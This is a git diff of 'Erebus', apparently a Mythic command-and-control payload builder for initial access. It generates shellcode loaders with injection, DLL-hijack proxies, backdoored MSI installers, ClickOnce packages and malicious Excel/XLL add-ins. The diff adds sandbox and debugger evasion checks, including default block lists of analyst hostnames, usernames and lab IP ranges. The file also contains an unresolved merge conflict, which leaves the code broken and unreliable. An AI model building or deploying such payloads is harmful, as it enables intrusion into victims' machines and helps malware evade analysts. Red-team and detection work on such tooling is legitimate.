@@ -1,12 +1,7 @@
 ﻿'''
 - Author(s): Lavender-exe // hunterino-sec // Whispergate
-- Title: Erebus
+- Title: Erebus // erebus_wrapper
 - Description: Initial Access Wrapper
-
-TODO:
-- Triggers
-    - LNK
-        -   https://github.com/strayge/pylnk
 '''
 
 from erebus_wrapper.erebus.modules.plugin_loader import get_plugin_loader
@@ -14,11 +9,30 @@ from erebus_wrapper.erebus.modules import run_plugin_validation, report_validati
 
 _plugin_loader = get_plugin_loader()
 
-try:
-    from erebus_wrapper.erebus.modules.archive.payload_dll_proxy import generate_proxies
-except ImportError:
-    generate_proxies = _plugin_loader.get_function("generate_proxies")
+_PLUGIN_FUNCTIONS = [
+    "generate_proxies",
+    "build_clickonce",
+    "build_msi",
+    "hijack_msi",
+    "add_multiple_files_to_msi",
+    "create_custom_action",
+    "create_payload_trigger",
+    "create_bat_payload_trigger",
+    "create_msi_payload_trigger",
+    "create_clickonce_trigger",
+    "build_7z",
+    "build_zip",
+    "build_iso",
+    "self_sign_payload",
+    "get_remote_cert_details",
+    "sign_with_provided_cert",
+    "generate_excel_payload",
+    "backdoor_existing_excel",
+    "generate_xll_template",
+    "register_xll_function",
+]
 
+<<<<<<< HEAD
 try:
     from erebus_wrapper.erebus.modules.archive.container_clickonce import build_clickonce
 except ImportError:
@@ -91,26 +105,25 @@ except ImportError:
 
 
 # ==================== End Plugin System ====================
+=======
+for _func_name in _PLUGIN_FUNCTIONS:
+    globals()[_func_name] = _plugin_loader.get_function(_func_name)
+>>>>>>> 5fbb0b4 (Removed DLL Hijacking)
 
 from mythic_container.PayloadBuilder import *
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
-
 from pathlib import PurePath
 from distutils.dir_util import copy_tree
 from jinja2 import Environment, FileSystemLoader
+from datetime import datetime
+from pathlib import Path
 import os
-import asyncio
-import subprocess
 import tempfile
 import shutil
 import hashlib
-import shlex
-import re
-import zipfile
-from datetime import datetime
-from pathlib import Path
-
+import asyncio
+import subprocess
 
 ENCRYPTION_METHODS = {
     # "AES128_CBC" :  "aes_128",
@@ -278,6 +291,135 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                 HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="3"),
+            ]
+        ),
+
+        # Guardrails Configuration
+        BuildParameter(
+            name = "0.5a Enable Guardrails",
+            parameter_type = BuildParameterType.Boolean,
+            description = "Enable guardrails (environment and anti-debugging checks) for the loader",
+            default_value = False,
+        ),
+
+        BuildParameter(
+            name = "0.5b Check IsDebuggerPresent",
+            parameter_type = BuildParameterType.Boolean,
+            description = "Enable check for IsDebuggerPresent and PEB.BeingDebugged flag",
+            default_value = True,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5c Check Remote Debugger",
+            parameter_type = BuildParameterType.Boolean,
+            description = "Enable check for remote debugger via NtQueryInformationProcess",
+            default_value = True,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5d Check Debugger Processes",
+            parameter_type = BuildParameterType.Boolean,
+            description = "Enable check for known debugger and analysis tool processes",
+            default_value = True,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5e Check Hardware Breakpoints",
+            parameter_type = BuildParameterType.Boolean,
+            description = "Enable check for hardware breakpoints in debug registers",
+            default_value = True,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5f Check Timing Anomalies",
+            parameter_type = BuildParameterType.Boolean,
+            description = "Enable timing-based debugger detection (RDTSC and Sleep checks)",
+            default_value = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5g Hostname Whitelist",
+            parameter_type = BuildParameterType.String,
+            description = "Comma-separated list of allowed hostnames (e.g., TARGET-PC,VICTIM-WORKSTATION). Leave empty to disable.",
+            default_value = "",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5h Block Analysis Hostnames",
+            parameter_type = BuildParameterType.String,
+            description = "Comma-separated list of blocked hostnames (e.g., SANDBOX,MALWARE-ANALYSIS,VM-WIN10)",
+            default_value = "SANDBOX,MALWARE-ANALYSIS,VM-WIN10,ANALYST-PC",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5i Block Analysis Usernames",
+            parameter_type = BuildParameterType.String,
+            description = "Comma-separated list of blocked usernames (e.g., analyst,malware,sandbox,user,admin)",
+            default_value = "analyst,malware,sandbox,user,admin",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5j IP Whitelist",
+            parameter_type = BuildParameterType.String,
+            description = "Comma-separated IP prefixes to allow (e.g., 10.,192.168.50.). Leave empty to disable.",
+            default_value = "",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5k IP Blacklist",
+            parameter_type = BuildParameterType.String,
+            description = "Comma-separated IP prefixes to block (e.g., 192.168.122.,172.16.,127.)",
+            default_value = "192.168.122.,172.16.,127.",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5l Domain Whitelist",
+            parameter_type = BuildParameterType.String,
+            description = "Comma-separated list of allowed domains (e.g., CORP.CONTOSO.COM,TARGET-DOMAIN.LOCAL). Leave empty to disable.",
+            default_value = "",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
             ]
         ),
 
@@ -604,36 +746,135 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
             ]
         ),
 
+        # DLL Hijack Built-in Guardrails
         BuildParameter(
-            name = "1.1 DLL Hijack Guardrail Includes",
-            parameter_type = BuildParameterType.String,
-            description = "Optional include block inserted before windows.h (e.g., #include <winsock2.h>)",
-            default_value = "",
-            required = False,
+            name = "1.1 Use Built-in Guardrails",
+            parameter_type = BuildParameterType.Boolean,
+            description = "Use built-in anti-debugging and environment checks instead of custom code",
+            default_value = False,
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
             ]
         ),
 
         BuildParameter(
-            name = "1.2 DLL Hijack Guardrail Code",
-            parameter_type = BuildParameterType.String,
-            description = "Optional guardrail C/C++ code. Must define BOOL ErebusGuardrail(void) and return TRUE to execute.",
-            default_value = "",
-            required = False,
+            name = "1.1a Check IsDebuggerPresent",
+            parameter_type = BuildParameterType.Boolean,
+            description = "Enable check for IsDebuggerPresent and PEB.BeingDebugged flag",
+            default_value = True,
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
             ]
         ),
 
         BuildParameter(
-            name = "1.3 DLL Hijack Guardrail Extra Libs",
-            parameter_type = BuildParameterType.String,
-            description = "Optional extra linker flags for hijack builds (e.g., -lws2_32)",
-            default_value = "",
-            required = False,
+            name = "1.1b Check Remote Debugger",
+            parameter_type = BuildParameterType.Boolean,
+            description = "Enable check for remote debugger via NtQueryInformationProcess",
+            default_value = True,
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "1.1c Check Debugger Processes",
+            parameter_type = BuildParameterType.Boolean,
+            description = "Enable check for known debugger and analysis tool processes",
+            default_value = True,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "1.1d Check Hardware Breakpoints",
+            parameter_type = BuildParameterType.Boolean,
+            description = "Enable check for hardware breakpoints in debug registers",
+            default_value = True,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "1.1e Check Timing Anomalies",
+            parameter_type = BuildParameterType.Boolean,
+            description = "Enable timing-based debugger detection (RDTSC and Sleep checks)",
+            default_value = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "1.1f Hostname Whitelist",
+            parameter_type = BuildParameterType.String,
+            description = "Comma-separated list of allowed hostnames (e.g., TARGET-PC,VICTIM-WORKSTATION). Leave empty to disable.",
+            default_value = "",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "1.1g Block Analysis Hostnames",
+            parameter_type = BuildParameterType.String,
+            description = "Comma-separated list of blocked hostnames (e.g., SANDBOX,MALWARE-ANALYSIS,VM-WIN10)",
+            default_value = "SANDBOX,MALWARE-ANALYSIS,VM-WIN10,ANALYST-PC",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "1.1h Block Analysis Usernames",
+            parameter_type = BuildParameterType.String,
+            description = "Comma-separated list of blocked usernames (e.g., analyst,malware,sandbox,user,admin)",
+            default_value = "analyst,malware,sandbox,user,admin",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "1.1i IP Whitelist",
+            parameter_type = BuildParameterType.String,
+            description = "Comma-separated IP prefixes to allow (e.g., 10.,192.168.50.). Leave empty to disable.",
+            default_value = "",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "1.1j IP Blacklist",
+            parameter_type = BuildParameterType.String,
+            description = "Comma-separated IP prefixes to block (e.g., 192.168.122.,172.16.,127.)",
+            default_value = "192.168.122.,172.16.,127.",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "1.1k Domain Whitelist",
+            parameter_type = BuildParameterType.String,
+            description = "Comma-separated list of allowed domains (e.g., CORP.CONTOSO.COM,TARGET-DOMAIN.LOCAL). Leave empty to disable.",
+            default_value = "",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
             ]
         ),
 
@@ -1054,40 +1295,6 @@ generated if none have been entered.""",
         except Exception as e:
             print(f"[!] Failed to generate IOCs file: {str(e)}")
 
-    # def cleanup_xll_and_create_clean_xlsx(self, xll_path: str, doc_name: str, payload_dir) -> str:
-    #     """
-    #     After XLL execution, create a clean XLSX file from template and delete the XLL.
-    #     This follows the approach used in XLL_Phishing to execute the XLL and clean up after.
-
-    #     Args:
-    #         xll_path: Path to the compiled XLL file
-    #         doc_name: Document name (without extension)
-    #         payload_dir: Directory where payload files are stored
-
-    #     Returns:
-    #         Path to the clean XLSX file
-    #     """
-    #     try:
-    #         # Get path to template.xlsx in erebus_xll directory
-    #         xll_dir = Path(__file__).resolve().parent.parent / "agent_code" / "erebus_xll"
-    #         template_xlsx = xll_dir / "template.xlsx"
-
-    #         if not template_xlsx.exists():
-    #             raise FileNotFoundError(f"Template XLSX not found at {template_xlsx}")
-
-    #         # Create clean XLSX file from template
-    #         clean_xlsx_path = Path(payload_dir) / f"{doc_name}.xlsx"
-    #         shutil.copy(str(template_xlsx), str(clean_xlsx_path))
-
-    #         # Delete the XLL file
-    #         if os.path.exists(xll_path):
-    #             os.remove(xll_path)
-
-    #         return str(clean_xlsx_path)
-
-    #     except Exception as e:
-    #         raise Exception(f"Failed to cleanup XLL and create clean XLSX: {str(e)}")
-
     async def obfuscate_vba(self, vba_code):
         """Obfuscate VBA code locally or via plugin"""
         try:
@@ -1206,7 +1413,7 @@ generated if none have been entered.""",
             # Try using Erebus.Helper on Windows first
             backdoored_msi_path = None
             try:
-                from agent_code.Erebus.Helper.main import MSIHelper
+                from erebus_wrapper.agent_code.Erebus.Helper.main import MSIHelper
 
                 # Use helper for MSI backdooring
                 msi_helper = MSIHelper()
@@ -1245,8 +1452,8 @@ generated if none have been entered.""",
                     condition=condition
                 )
 
-                # Move the backdoored MSI into the payload directory
-                final_msi_path = payload_dir / f"{source_msi_path.stem}-backdoored.msi"
+                # Copy the patched MSI into the payload directory
+                final_msi_path = payload_dir / f"{source_msi_path.stem}-patched.msi"
                 shutil.copy2(backdoored_msi_path, final_msi_path)
 
             # Build success message with attack details
@@ -1278,7 +1485,6 @@ generated if none have been entered.""",
 
     async def containerise_payload(self,agent_build_path):
         """Creates a container and adds all files generated from the payload function inside of the given archive/media"""
-
 
         ext_source = self.get_parameter("0.8 Output Extension Source")
         if ext_source == "MalDoc":
@@ -1357,13 +1563,11 @@ generated if none have been entered.""",
             generation_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
             agent_build_path = tempfile.TemporaryDirectory(suffix = self.uuid).name
-            copy_tree(str(self.agent_code_path), agent_build_path)
+            agent_code_path = Path(__file__).resolve().parent.parent / "agent_code"
+            copy_tree(str(agent_code_path), agent_build_path)
 
             mythic_shellcode_path = PurePath(agent_build_path) / "shellcode" / "payload.bin"
             mythic_shellcode_path = str(mythic_shellcode_path)
-
-            hijack_dir = PurePath(agent_build_path) / "hijack"
-            hijack_dir_str = str(hijack_dir)
 
             obfuscated_shellcode_path = PurePath(agent_build_path) / "shellcode" / "obfuscated.bin"
             obfuscated_shellcode_path = str(obfuscated_shellcode_path)
@@ -1371,7 +1575,6 @@ generated if none have been entered.""",
             shellcode_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader"
             clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
             encrypted_shellcode_path_sc = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "shellcode.hpp"
-            encrypted_shellcode_path_dll = PurePath(agent_build_path) / "hijack" / "shellcode.hpp"
             encrypted_shellcode_path_xll = PurePath(agent_build_path) / "erebus_xll" / "xll_shellcode.h"
 
             # Build XLL in the main erebus_xll directory (inside the working build tree)
@@ -1385,7 +1588,6 @@ generated if none have been entered.""",
             shellcode_loader_path = str(shellcode_loader_path)
             clickonce_loader_path = str(clickonce_loader_path)
             encrypted_shellcode_path_sc = str(encrypted_shellcode_path_sc)
-            encrypted_shellcode_path_dll = str(encrypted_shellcode_path_dll)
             encrypted_shellcode_path_xll = str(encrypted_shellcode_path_xll)
 
             shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
@@ -1393,11 +1595,14 @@ generated if none have been entered.""",
 
             templates_path = PurePath(agent_build_path) / "templates"
             dll_exports_path = templates_path / "proxy.def"
+            loader_exports_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "defs" / "proxy.def"
 
             dll_target_path = templates_path / "dll_target.dll"
 
             templates_path = str(templates_path)
             dll_exports_path = str(dll_exports_path)
+            loader_exports_path = str(loader_exports_path)
+            Path(loader_exports_path).parent.mkdir(parents=True, exist_ok=True)
 
             # Create payload directory if it doesn't exist
             payload_dir = Path(agent_build_path) / "payload"
@@ -1571,7 +1776,7 @@ generated if none have been entered.""",
 
                 if self.get_parameter("0.9h XLL Payload Type") == "XLL Add-In DLL":
                     shutil.copy(src=str(obfuscated_shellcode_path),
-                                dst=str(xll_shellcode_path))     
+                                dst=str(xll_shellcode_path))
 
                 if self.get_parameter("2.4 Shellcode Format") == "Raw":
                     # Get the encryption key in C format to be used within the loader and other functions
@@ -1650,11 +1855,14 @@ generated if none have been entered.""",
             output = ""
             ######################### End of Shellcode Obfuscation Section #########################
 
-            ######################### DLL Hijacking Section #########################
-            if self.get_parameter("0.0 Main Payload Type") == "Hijack":
-                print(f'User Selected: {self.get_parameter("0.0 Main Payload Type")}')
-
-                # Get the DLL target's file content & information
+            ######################### Payload Build Section #########################
+            # Determine payload type and configure accordingly
+            payload_type = self.get_parameter("0.0 Main Payload Type")
+            dll_file_name = None  # Used to store DLL filename for final payload naming
+            print(f'User Selected: {payload_type}')
+            
+            if payload_type == "Hijack":
+                # [DLL HIJACK SPECIFIC] Get the DLL target file from Mythic
                 file_content = await getFileFromMythic(
                     agentFileId=self.get_parameter("1.0 DLL Hijacking")
                 )
@@ -1664,33 +1872,24 @@ generated if none have been entered.""",
                 ))
 
                 dll_file_name = ""
-                if file_name_resp.Success:
-                    if len(file_name_resp.Files) > 0:
-                        dll_file_name = file_name_resp.Files[0].Filename
+                if file_name_resp.Success and len(file_name_resp.Files) > 0:
+                    dll_file_name = file_name_resp.Files[0].Filename
 
                 with open(dll_target_path, "wb") as file:
                     file.write(file_content)
 
-                payload_path = PurePath(agent_build_path) / "payload" / dll_file_name
-                payload_path = str(payload_path)
-
+                # [DLL HIJACK SPECIFIC] Generate proxy exports
                 exports = await generate_proxies(dll_file=dll_target_path, dll_file_name=dll_file_name)
-
-                # Debug logging
                 output += f"[DEBUG] Generated exports ({len(exports) if exports else 0} chars):\n{exports[:500] if exports else 'None'}\n"
 
-                exports_list = {
-                    "EXPORTS": exports
-                }
-
+                exports_list = {"EXPORTS": exports}
                 proxy_template = environment.get_template("proxy.def")
                 proxy_output = proxy_template.render(**exports_list)
 
                 with open(dll_exports_path, "w") as file:
                     file.write(proxy_output)
 
-                # Validate that proxy.def was generated with actual exports
-                # The file should contain "EXPORTS" header (8 bytes) plus at least one export line
+                # Validate proxy.def was generated with actual exports
                 if not exports or len(exports.strip()) == 0 or os.stat(dll_exports_path).st_size <= 20:
                     response.status = BuildStatus.Error
                     response.build_message = f"Failed to proxy the given file. No exports found or file too small ({os.stat(dll_exports_path).st_size} bytes)."
@@ -1702,126 +1901,26 @@ generated if none have been entered.""",
                         StepSuccess=False,
                     ))
                     return response
-                else:
-                    response.status = BuildStatus.Success
-                    response.build_message = "DLL Proxied! Compiling Payload..."
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1518] - Gathering DLL Exports for Hijacking",
-                        StepStdout="DLL Proxied! Compiling Payload...",
-                        StepSuccess=True,
-                    ))
+                
+                shutil.copy(src=dll_exports_path, dst=loader_exports_path)
+                response.status = BuildStatus.Success
+                response.build_message = "DLL Proxied! Compiling Payload..."
+                await SendMythicRPCPayloadUpdatebuildStep(
+                    MythicRPCPayloadUpdateBuildStepMessage(
+                    PayloadUUID=self.uuid,
+                    StepName="[T1518] - Gathering DLL Exports for Hijacking",
+                    StepStdout="DLL Proxied! Compiling Payload...",
+                    StepSuccess=True,
+                ))
 
-                # Load and render the config template
-                config_template = environment.get_template("config.hpp")
-                # Escape backslashes for C++ wide string literal
-                target_process = self.get_parameter("0.5 Shellcode Loader - Target Process").replace("\\", "\\\\")
-                compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
-                encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
-                config_data = {
-                    "TARGET_PROCESS": target_process,
-                    "INJECTION_TYPE": self.get_parameter("0.4 Shellcode Loader - Injection Type"),
-                    "COMPRESSION_TYPE": compression_type_value,
-                    "ENCODING_TYPE": encoding_type_value,
-                    "ENCRYPTION_TYPE": encryption_type_value,
-                }
-                rendered_config = config_template.render(**config_data)
-
-                config_hpp_destination = PurePath(hijack_dir) / "config.hpp"
-                config_hpp_destination = str(config_hpp_destination)
-
-                # Write the rendered config to the destination
-                with open(config_hpp_destination, "w", encoding="utf-8") as config_file:
-                    config_file.write(rendered_config)
-
-                # Render guardrail header for hijack payload
-                guardrail_includes = (self.get_parameter("1.1 DLL Hijack Guardrail Includes") or "").strip()
-                guardrail_code = (self.get_parameter("1.2 DLL Hijack Guardrail Code") or "").strip()
-                guardrail_template = environment.get_template("guardrail.hpp")
-                rendered_guardrail = guardrail_template.render(
-                    guardrail_includes=guardrail_includes,
-                    guardrail_code=guardrail_code
-                )
-
-                guardrail_hpp_destination = PurePath(hijack_dir) / "guardrail.hpp"
-                guardrail_hpp_destination = str(guardrail_hpp_destination)
-
-                with open(guardrail_hpp_destination, "w", encoding="utf-8") as guardrail_file:
-                    guardrail_file.write(rendered_guardrail)
-
-                # Use make to compile the DLL with all hijack directory files
-                cmd = [
-                    "make",
-                    "-C",
-                    hijack_dir_str,
-                    f"OUTPUT_PATH={PurePath(agent_build_path) / 'payload'}",
-                    f"DLL_NAME={dll_file_name}",
-                    f"TEMPLATE_PATH={templates_path}",
-                ]
-
-                hijack_extra_libs = (self.get_parameter("1.3 DLL Hijack Guardrail Extra Libs") or "").strip()
-                if hijack_extra_libs:
-                    cmd.append(f"EXTRA_LIBS={hijack_extra_libs}")
-
-                process = await asyncio.create_subprocess_exec(
-                    *cmd,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE,
-                )
-
-                stdout, stderr = await process.communicate()
-
-                if stdout:
-                    output += f"[stdout]\n{stdout.decode()}"
-                if stderr:
-                    output += f"[stderr]\n{stderr.decode()}"
-
-                if os.path.exists(payload_path):
-                    # response.payload = open(payload_path, "rb").read()
-                    response.status = BuildStatus.Success
-                    response.build_message = "DLL Compiled!"
-                    response.build_stdout = output + "\n" + payload_path
-                    # response.updated_filename = dll_file_name
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1027.011] - Compiling DLL Payload",
-                        StepStdout="DLL Loader Compiled!",
-                        StepSuccess=True,
-                    ))
-                    # Debug
-                    # return response
-                else:
-                    response.status = BuildStatus.Error
-                    response.payload = b""
-                    response.build_message = "Failed to compile DLL"
-                    response.build_stderr = output + "\n" + payload_path
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1027.011] - Compiling DLL Payload",
-                        StepStdout="Failed to Compile DLL Payload",
-                        StepSuccess=False,
-                    ))
-                    return response
-                output = ""
-            ######################### End Of DLL Hijacking Section #########################
-
-            ######################### Shellcode Loader Section #########################
-            if self.get_parameter("0.0 Main Payload Type") == "Loader":
-                print(f'User Selected: {self.get_parameter("0.0 Main Payload Type")}')
-                # Logic : Select between shellcode loader and clickonce loader
-                if self.get_parameter("0.1 Loader Type") == "Shellcode Loader":
+            elif payload_type == "Loader":
+                loader_type = self.get_parameter("0.1 Loader Type")
+                
+                if loader_type == "Shellcode Loader":
                     shutil.copy(dst=f"{shellcode_loader_path}/erebus.bin",
                                 src=obfuscated_shellcode_path)
 
-                    payload_path = PurePath(agent_build_path) / "payload" / "erebus.exe"
-                    payload_path = str(payload_path)
-
                     # ===== Configure Shellcode Loader config.hpp =====
-                    config_hpp_template_path = PurePath(agent_build_path) / "templates" / "config.hpp"
-                    config_hpp_template_path = str(config_hpp_template_path)
                     config_hpp_destination = PurePath(shellcode_loader_path) / "include" / "config.hpp"
                     config_hpp_destination = str(config_hpp_destination)
 
@@ -1832,6 +1931,15 @@ generated if none have been entered.""",
                         target_process = self.get_parameter("0.5 Shellcode Loader - Target Process").replace("\\", "\\\\")
                         compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
                         encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
+
+                        # Guardrails configuration for Shellcode Loader
+                        guardrails_enabled = 1 if self.get_parameter("0.5a Enable Guardrails") else 0
+                        guardrails_check_debugger = 1 if self.get_parameter("0.5b Check IsDebuggerPresent") else 0
+                        guardrails_check_remote = 1 if self.get_parameter("0.5c Check Remote Debugger") else 0
+                        guardrails_check_processes = 1 if self.get_parameter("0.5d Check Debugger Processes") else 0
+                        guardrails_check_hwbp = 1 if self.get_parameter("0.5e Check Hardware Breakpoints") else 0
+                        guardrails_check_timing = 1 if self.get_parameter("0.5f Check Timing Anomalies") else 0
+
                         config_data = {
                             "TARGET_PROCESS": target_process,
                             "INJECTION_TYPE": self.get_parameter("0.4 Shellcode Loader - Injection Type"),
@@ -1840,6 +1948,12 @@ generated if none have been entered.""",
                             "ENCRYPTION_TYPE": encryption_type_value,
                             "ENCRYPTION_KEY": encryption_key_bytes,
                             "ENCRYPTION_IV": encryption_iv_bytes,
+                            "GUARDRAILS_ENABLED": guardrails_enabled,
+                            "GUARDRAILS_CHECK_DEBUGGER": guardrails_check_debugger,
+                            "GUARDRAILS_CHECK_REMOTE_DEBUGGER": guardrails_check_remote,
+                            "GUARDRAILS_CHECK_DEBUGGER_PROCESSES": guardrails_check_processes,
+                            "GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS": guardrails_check_hwbp,
+                            "GUARDRAILS_CHECK_TIMING": guardrails_check_timing,
                         }
                         rendered_config = config_template.render(**config_data)
 
@@ -1868,66 +1982,14 @@ generated if none have been entered.""",
                         ))
                         return response
 
-                    # Compile Loader
-                    cmd = [
-                        "make",
-                        "-C",
-                        shellcode_loader_path,
-                        f"BUILD={self.get_parameter('0.3 Loader Build Configuration')}",
-                        "all"
-                    ]
-                    process = await asyncio.create_subprocess_exec(
-                        *cmd,
-                        stdout=asyncio.subprocess.PIPE,
-                        stderr=asyncio.subprocess.PIPE,
-                    )
-                    stdout, stderr = await process.communicate()
-
-                    if stdout:
-                        output += f"[stdout]\n{stdout.decode(errors='replace')}"
-                    if stderr:
-                        output += f"[stderr]\n{stderr.decode(errors='replace')}"
-
-                    shutil.copy(dst=payload_path, src=f"{shellcode_loader_path}/erebus.exe")
-
-                    if os.path.exists(payload_path):
-                        response.status = BuildStatus.Success
-                        response.build_message = "Loader Compiled!"
-                        response.build_stdout = output + "\n" + payload_path
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName="[T1027] - Compiling Shellcode Loader",
-                            StepStdout="Shellcode Loader Compiled!",
-                            StepSuccess=True,
-                        ))
-
-                    else:
-                        response.status = BuildStatus.Error
-                        response.build_message = "Failed to compile loader"
-                        response.build_stderr = output + "\n" + payload_path
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName="[T1027] - Compiling Shellcode Loader",
-                            StepStdout="Failed to Compile Shellcode Loader",
-                            StepSuccess=False,
-                        ))
-                        return response
-                    output = ""
